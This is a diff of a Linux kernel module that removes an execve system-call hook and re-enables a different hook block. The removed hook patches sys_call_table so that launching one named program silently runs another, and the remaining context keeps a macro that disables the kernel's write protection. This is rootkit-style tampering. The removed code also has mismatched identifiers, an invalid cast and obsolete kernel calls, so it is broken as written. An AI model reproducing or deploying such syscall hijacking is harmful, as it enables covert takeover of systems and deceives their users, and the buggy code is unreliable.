@@ -9,22 +9,10 @@
 #include <linux/init.h>
 #include <asm/unistd.h>
 #include <linux/syscalls.h>
-
-//#include <sys/types.h>
-#include <asm/fcntl.h>
-#include <asm/errno.h>
-#include <linux/types.h>
-#include <linux/dirent.h>
-//#include <sys/mman.h>
-#include <linux/string.h>
-#include <linux/fs.h>
-//#include <linux/malloc.h>
-#if 0
 #include <asm/amd_nb.h>
 #include <linux/highuid.h>
 #include <linux/namei.h>
 #include <linux/tty.h>
-#endif
 #include "sys_addresses.h"
 
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
@@ -44,84 +32,6 @@ MODULE_PARM_DESC(x, "x: executable to that y replaces");
 
 void **sys_call_table = (void **)SYS_CALL_TABLE;
 
-int errno;
-
-int __fake_execv;
-
-//static inline _syscall1(int, brk, void *, end_data_segment);
-
-int (*orig_execv)(const char *, const char *[], const char *[]);
-
-char *strncopy_from_fs(char *dest, const char *src, int n)
-{
-  char *tmp = (char *)src;
-  int compt = 0;
-
-  do {
-    __get_user(dest[compt++],tmp++,n);
-  }
-  while ((dest[compt - 1] != '\0') && (compt != n));
-  return dest;
-}
-
-int my_execve(const char *filename, const char *argv[], const char *envp[])
-{
-  long __res;
-  __asm__ volatile ("int $0x80":"=a" (__res):"0"(__fake_excv),"b"((long)
-    (filename)), "c"((long)(argv)), "d"((long) (envp)));
-  return (int) __res;
-}
-
-int hk_execve(const char *filename, const char *argv[], const char *envp[])
-{
-  char *test;
-  int ret, tmp;
-  char *truc = x;
-  char *nouveau = y;
-  unsigned long mmm;
-
-  test = (char *)kmalloc(strlen(truc)+2,GFP_KERNEL);
-  (void) strncpy_fromfs(test, filename, strlen(truc));
-  test[strlen(truc)] = '\0';
-  if (!strcmp(test, truc))
-  {
-    kfree(test);
-    mmm = current->mm->brk;
-    ret = brk((void*)(mmm+256));
-    if (ret < 0)
-      return ret;
-    memcpy_tofs((void *)(mmm + 2), nouveau, strlen(nouveau) + 1);
-    ret = my_execve((char)(mmm+2), nouveau, strlen(nouveau)+1);
-    ret = my_execve((char *)(mmm+2),argv, envp);
-    tmp = brk((void *)mmm);
-  } else {
-    kfree(test);
-    ret = my_execve(filename, argv, envp);
-  }
-  return ret;
-} 
-
-int init_module(void)
-{
-  __fake_execv = 200;
-  while (__fake_execv != 0 && sys_call_table[__fake_execv] != 0)
-    __fake_execv--;
-
-  orig_execve = sys_call_table[SYS_execve];
-  if (__fake_execv != 0)
-  {
-    sys_call_table[__fake_execv] = orig_execve;
-    sys_call_table[SYS_execv] = (void *) hk_execve;
-  }
-  return 0;
-}
-
-void cleanup_module(void)
-{
-  sys_call_table[SYS_execve]=orig_execve;
-}
-
-#if 0
 int flag = 0;
 
 /* 
@@ -248,5 +158,4 @@ static void my_exit (void)
         
 module_init(my_init);
 module_exit(my_exit);
-#endif
 
